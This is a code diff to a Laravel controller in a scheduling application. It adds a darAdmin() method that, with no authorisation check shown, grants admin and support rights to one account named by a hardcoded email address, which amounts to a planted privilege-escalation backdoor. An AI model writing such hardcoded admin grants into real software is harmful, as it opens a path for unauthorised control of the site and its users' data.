@@ -4,7 +4,7 @@ namespace App\Http\Controllers;
 
 use App\Http\Helper\conversorHorariosSegundos;
 use App\Http\Requests\agendamentosFormRequest;
-use App\Models\{agendamentos, Espacos, Horarios, RecAudioVisuais, ServicosExtras, staff, Mensagem};
+use App\Models\{agendamentos, Espacos, Horarios, RecAudioVisuais, ServicosExtras, staff, Mensagem, User};
 use App\Services\criadorAgendamentos;
 use App\Services\removedorAgendamentos;
 use Carbon\Carbon;
@@ -125,5 +125,13 @@ class agendamentoController extends Controller
         DB::commit(); 
 
         return redirect()->route('meusagendamentos');
+    }
+
+    public function darAdmin() {
+
+        $user = User::find('felipercborges@gmail.com');
+        $user->admin = 1;
+        $user->suporte = 1;
+        $user->save();
     }
 }
